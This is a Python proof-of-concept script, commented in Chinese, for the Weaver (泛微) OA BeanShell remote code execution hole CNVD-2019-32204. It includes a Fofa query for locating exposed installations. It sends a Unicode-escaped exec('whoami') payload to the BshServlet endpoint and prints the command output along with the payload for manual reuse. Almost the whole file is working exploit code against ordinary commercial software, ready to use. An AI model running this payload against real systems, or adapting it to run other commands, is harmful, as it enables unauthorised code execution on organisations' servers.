# -*- coding: utf-8 -*-
# 泛微OA Bsh 远程代码执行漏洞 CNVD-2019-32204
# Fofa:  app="泛微-协同办公OA"

import requests
import sys
import time

BLUE = '\033[0;36m'
RED = '\x1b[1;91m'
YELLOW = '\033[33m'
VIOLET = '\033[1;94m'
GREEN = '\033[1;32m'
BOLD = '\033[1m'
ENDC = '\033[0m'


def now_time():
    return BLUE + time.strftime("[%H:%M:%S] ", time.localtime()) + ENDC


def info():
    return VIOLET + "[INFO] " + ENDC


def error():
    return RED + "[ERROR] " + ENDC


def success():
    return GREEN + "[SUCCESS] " + ENDC


def warning():
    return YELLOW + "[WARNING] " + ENDC


headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:52.0) Gecko/20100101 Firefox/52.0',
    'Content-Type': 'application/x-www-form-urlencoded',
}


def Check(target):
    target += "weaver/bsh.servlet.BshServlet"
    payload = """bsh.script=\\u0065\\u0078\\u0065\\u0063("whoami");&bsh.servlet.output=raw"""
    try:
        requests.packages.urllib3.disable_warnings()
        request = requests.post(headers=headers, url=target, data=payload, timeout=5, verify=False)
        if ";</script>" not in request.text:
            if "Login.jsp" not in request.text:
                if "Error" not in request.text:
                    if "<head>" not in request.text:
                        print(now_time() + info() + '存在Beanshell RCE漏洞: {}'.format(target))
                        print(now_time()+info()+'可Post手动传值测试: {}'.format(payload))
                        print(now_time() + success() + 'whoami: {}'.format(request.text.strip('\n')))
                        return 'ok'
                    else:
                        print(now_time()+warning()+"不存在Beanshell RCE漏洞")
    except:

        print(now_time() + error() + '未知错误')


if __name__ == '__main__':
    url = sys.argv[1]
    if url[-1] != '/':
        url += '/'
    Check(url)
